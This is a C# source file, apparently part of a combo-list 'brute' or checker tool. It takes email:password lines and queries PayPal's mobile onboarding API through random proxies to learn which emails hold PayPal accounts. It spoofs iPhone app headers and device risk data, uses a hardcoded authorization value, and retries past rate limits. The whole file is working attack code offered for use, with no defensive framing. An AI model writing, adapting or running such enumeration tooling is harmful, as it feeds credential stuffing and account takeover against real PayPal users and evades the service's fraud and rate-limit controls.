using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using Console = Colorful.Console;
using System.Drawing;
using System.Net;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Web;

namespace Quantify
{
	public static class VMBruteV1
	{
		public static long ToUnixTimeSeconds(this DateTime dateTime)
		{
			return (long)dateTime.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
		}
		public static void Start(string Combo)
		{
			MakeRequest(Combo);
		}
		public static bool HasSpecialChar(string input)
		{
			foreach (char value in "\\|!#$%&/()=?»«@£§€{}.-;'<>_,")
			{
				if (input.Contains(value))
				{
					return true;
				}
			}
			return false;
		}
		public static void MakeRequest(string c)
		{
			string email = string.Empty;
			string password = string.Empty;
			if (c.Contains(":"))
			{
				email = c.Split(new string[]
				{
					":"
				}, StringSplitOptions.None)[0];
				password = c.Split(new string[]
				{
					":"
				}, StringSplitOptions.None)[1];
			}
			else if (!c.Contains(":"))
			{
				return;
			}
			try
			{
                Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest();
				Functions.SetupRequest(httpRequest);
				var flagg = Vars.Proxytype != 5;
				if (flagg) httpRequest.Proxy = ProxyClient.Parse(Vars.proxyType, Vars.Proxiess[new Random().Next(Vars.Proxiess.Count)]);
				httpRequest.AddHeader("Host", "api-m.paypal.com");
				httpRequest.AddHeader("paypal-client-metadata-id", "b27792a1676f4355b929503a6e5dabf2");
				httpRequest.AddHeader("Accept", "application/json");
				httpRequest.AddHeader("X-PayPal-ConsumerApp-Context", "%7B%22deviceLocationCountry%22%3A%22DZ%22%2C%22deviceLocale%22%3A%22en_DZ%22%2C%22deviceOSVersion%22%3A%2214.0.1%22%2C%22deviceLanguage%22%3A%22en-DZ%22%2C%22appGuid%22%3A%22085E29B9-325D-430B-9004-3BE6E4D3B833%22%2C%22deviceId%22%3A%220629A0AB-9072-4D4D-A66F-49E49BCC187C%22%2C%22deviceType%22%3A%22iOS%22%2C%22deviceNetworkCarrier%22%3A%22Unknown%22%2C%22deviceModel%22%3A%22iPhone%22%2C%22appName%22%3A%22com.yourcompany.PPClient%22%2C%22deviceOS%22%3A%22iOS%22%2C%22visitorId%22%3A%22085E29B9-325D-430B-9004-3BE6E4D3B833%22%2C%22deviceNetworkType%22%3A%22Unknown%22%2C%22usageTrackerSessionId%22%3A%22FA56BAC6-2157-47BF-817C-87D2880DDEF8%22%2C%22appVersion%22%3A%228.4.3%22%2C%22sdkVersion%22%3A%221.0.0%22%2C%22deviceMake%22%3A%22Apple%22%2C%22riskVisitorId%22%3A%22oZN2bYdCd8cKU_1hHi0in7L5gf_txMCZaHuuydJyVbCrTHZKbIZqjldBY9RRBLZxWbL_spHqm8_c9-Oy%22%7D");
				httpRequest.AddHeader("Authorization", "Basic QVY4aGRCQk04MHhsZ0tzRC1PYU9ReGVlSFhKbFpsYUN2WFdnVnB2VXFaTVRkVFh5OXBtZkVYdEUxbENxOg==");
				httpRequest.AddHeader("X-PAYPAL-FPTI", "{\"user_guid\":\"085E29B9-325D-430B-9004-3BE6E4D3B833\", \"user_session_guid\":\"FA56BAC6-2157-47BF-817C-87D2880DDEF8\"}");
				httpRequest.AddHeader("Accept-Language", "en-us");
				httpRequest.AddHeader("Content-Type", "application/json");
				httpRequest.AddHeader("x-paypal-mobileapp", "dmz-access-header");
				httpRequest.AddHeader("User-Agent", "PayPal/77 (iPhone; iOS 14.0.1; Scale/2.00)");
				httpRequest.AddHeader("Connection", "keep-alive");
				httpRequest.AddHeader("paypal-request-id", "644a3d46b10f4fb9b83e87969b8f3b7b");
				string str = "{\"flowId\":\"Onboarding\",\"riskData\":\"{\\\"is_emulator\\\":false,\\\"device_uptime\\\":,\\\"ip_addrs\\\":\\\"\\\",\\\"risk_comp_session_id\\\":\\\"\\\",\\\"device_model\\\":\\\"iPhone\\\",\\\"linker_id\\\":\\\"\\\",\\\"app_version\\\":\\\"7.42.3\\\",\\\"os_type\\\":\\\"iOS\\\",\\\"location_auth_status\\\":\\\"unknown\\\",\\\"is_rooted\\\":false,\\\"ds\\\":true,\\\"TouchIDEnrolled\\\":\\\"false\\\",\\\"app_id\\\":\\\"com.yourcompany.PPClient\\\",\\\"proxy_setting\\\":\\\"host=,port=,type=\\\",\\\"conf_url\\\":\\\"https:\\\\\\/\\\\\\/www.paypalobjects.com\\\\\\/rdaAssets\\\\\\/magnes\\\\\\/magnes_ios_rec.json\\\",\\\"payload_type\\\":\\\"full\\\",\\\"rf\\\":\\\"0000\\\",\\\"app_guid\\\":\\\"\\\",\\\"email_configured\\\":true,\\\"tz_name\\\":\\\"Europe\\\\\\/\\\",\\\"locale_lang\\\":\\\"en\\\",\\\"bindSchemeAvailable\\\":\\\"crypto:kmli,biometric:faceid\\\",\\\"cloud_identifier\\\":\\\"\\\",\\\"total_storage_space\\\":127933894656,\\\"tz\\\":7200000,\\\"locale_country\\\":\\\"\\\",\\\"pairing_id\\\":\\\"\\\",\\\"dbg\\\":false,\\\"c\\\":95,\\\"sr\\\":{\\\"gy\\\":true,\\\"mg\\\":true,\\\"ac\\\":true},\\\"vendor_identifier\\\":\\\"\\\",\\\"t\\\":false,\\\"TouchIDAvailable\\\":\\\"true\\\",\\\"dc_id\\\":\\\"\\\",\\\"device_name\\\":\\\"\\\",\\\"magnes_source\\\":10,\\\"pin_lock_last_timestamp\\\":,\\\"local_identifier\\\":\\\"\\\",\\\"os_version\\\":\\\"14.6\\\",\\\"timestamp\\\":1626436936905,\\\"source_app_version\\\":\\\"7.42.3\\\",\\\"conn_type\\\":\\\"wifi\\\",\\\"PasscodeSet\\\":\\\"true\\\",\\\"magnes_guid\\\":{\\\"created_at\\\":1594847338188,\\\"id\\\":\\\"\\\"},\\\"conf_version\\\":\\\"1.0\\\",\\\"ip_addresses\\\":[\\\"\\\"],\\\"bindSchemeEnrolled\\\":\\\"none\\\",\\\"mg_id\\\":\\\"\\\",\\\"comp_version\\\":\\\"5.2.0\\\",\\\"sms_enabled\\\":true}\",\"appInfo\":\"{\\\"device_app_id\\\":\\\"com.yourcompany.PPClient\\\",\\\"client_platform\\\":\\\"Apple\\\",\\\"app_version\\\":\\\"7.42.3\\\",\\\"app_category\\\":3,\\\"app_guid\\\":\\\"\\\",\\\"push_notification_id\\\":\\\"disabled\\\"}\",\"emailId\":\"" + email + "\",\"firstPartyClientId\":\"\",\"deviceInfo\":\"{\\\"device_identifier\\\":\\\"\\\",\\\"device_name\\\":\\\"\\\",\\\"device_type\\\":\\\"iOS\\\",\\\"device_key_type\\\":\\\"APPLE_PHONE\\\",\\\"device_model\\\":\\\"iPhone\\\",\\\"device_os\\\":\\\"iOS\\\",\\\"device_os_version\\\":\\\"14.6\\\",\\\"is_device_simulator\\\":false,\\\"pp_app_id\\\":\\\"\\\"}\",\"redirectUri\":\"urn:ietf:wg:oauth:2.0:oob\"}";
				string httpResponse = httpRequest.Post("https://api-m.paypal.com/v1/mfsonboardingserv/user/verification/email", str, "application/json").ToString();
				bool bad = httpResponse.Contains("\"status\":\"Failure\"");
				if (bad)
				{
					Keychecks.Bad(c);
				}
				else
				{
					bool good = httpResponse.Contains("This email already exists with PayPal");
					if (good)
					{
						Keychecks.Hit(c);
					}
					else
                    {
						bool ban = httpResponse.Contains("RATE_LIMIT_REACHED");
						if (ban)
                        {
							Keychecks.Retries(c);
							MakeRequest(c);
						}
						else
                        {
							Keychecks.Errors(c);
							MakeRequest(c);
						}
					}
				}
			}
			catch (Leaf.xNet.HttpException)
			{
				 Keychecks.Retries(c);
				 MakeRequest(c);
			}
			catch
			{
				Keychecks.Errors(c);
				MakeRequest(c);
			} 
		}
	}
}
